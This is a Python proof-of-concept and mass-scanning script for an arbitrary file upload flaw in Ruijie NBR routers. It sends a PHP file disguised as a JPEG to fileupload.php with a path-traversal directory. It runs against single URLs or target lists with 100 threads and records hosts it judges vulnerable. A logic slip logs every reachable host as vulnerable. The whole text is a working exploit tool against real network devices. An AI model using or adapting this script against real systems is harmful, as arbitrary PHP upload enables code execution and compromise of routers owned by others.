# 锐捷 NBR 路由器任意文件上传漏洞复现
import argparse, requests, sys, time, re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
        ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗         ███████╗██╗██╗     ███████╗
        ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗        ██╔════╝██║██║     ██╔════╝
        ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║        █████╗  ██║██║     █████╗  
        ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║        ██╔══╝  ██║██║     ██╔══╝  
        ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝███████╗██║     ██║███████╗███████╗
         ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝ 
                                                                                        author:秋妤
                                                                                        date:2024.10.04
                                                                                        version:1.0

                                                                          """
    print(test)


def poc(target):
    api_payload = '/ddi/server/fileupload.php?uploadDir=../../321&name=123.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }
    files = {
        'file': ('111.php', '<?php phpinfo();?>', 'image/jpeg')
    }
    try:
        res = requests.get(url=target, verify=False, timeout=10)
        if res.status_code == 200:
            response = requests.post(url=target + api_payload, headers=headers, files=files, verify=False, timeout=10)
            if response.status_code == 200 and '123.php' in response.text:
                print(f"[+]{target} 存在文件上传漏洞")
            with open('锐捷_result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在文件上传漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


def main():
    banner()
    parser = argparse.ArgumentParser(description="这是一个 锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞脚本")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file ,'r' ,encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n' ,''))
        mp = Pool(100)
        mp.map(poc ,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()